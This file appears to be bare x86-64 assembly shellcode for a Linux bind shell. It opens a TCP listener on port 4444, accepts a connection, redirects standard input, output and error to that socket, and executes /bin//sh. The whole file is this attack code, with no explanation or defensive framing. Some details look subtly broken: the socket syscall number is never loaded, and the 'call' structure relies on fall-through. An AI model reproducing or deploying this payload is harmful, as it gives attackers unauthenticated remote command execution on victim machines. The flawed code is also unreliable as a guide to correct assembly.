BITS 64

section .text

global .start

.start:
    call .socket
    call .struct
    call .listener
    call .dup2
    call .exec

.socket:
	  mov rdi, 0x2
	  mov rsi, 0x1
	  xor rdx, rdx
	  syscall
          mov rdi, rax

.struct:
   	  xor rax, rax 
	  push rax
	  mov dword [rsp-0x4], eax
	  mov word [rsp-0x6], 0x5c11
	  mov word [rsp-0x8], 0x2
	  sub rsp, 0x8

.listener:
	  mov rax, 0x31
	  mov rsi, rsp
	  mov rdx, 0x10
	  syscall
	  mov rax, 0x32
	  mov rsi, 0x2
	  syscall
    
	  mov rax, 0x2b
	  sub rsp, 0x10
	  mov rsi, rsp
   	  mov byte [rsp-0x1], 0x10
    	  sub rsp, 0x1
    	  mov rdx, rsp
    	  syscall
	  mov r9, rax 
   	  mov rax, 0x3
    	  syscall

.dup2:
    	  mov rdi, r9
    	  mov rax, 0x21
   	  xor rsi, rsi
   	  syscall
    
   	  mov rax, 0x21
  	  mov rsi, 1
   	  syscall
    
   	  mov rax, 0x21
   	  mov rsi, 2
    	  syscall


.exec:
          xor rax, rax
    	  push rax
    	  mov rbx, 0x68732f2f6e69622f
   	  push rbx
    	  mov rdi, rsp
    	  push rax
    
   	  mov rdx, rsp
    	  push rdi
    
    	  mov rsi, rsp
   	  add rax, 0x3b
    	  syscall
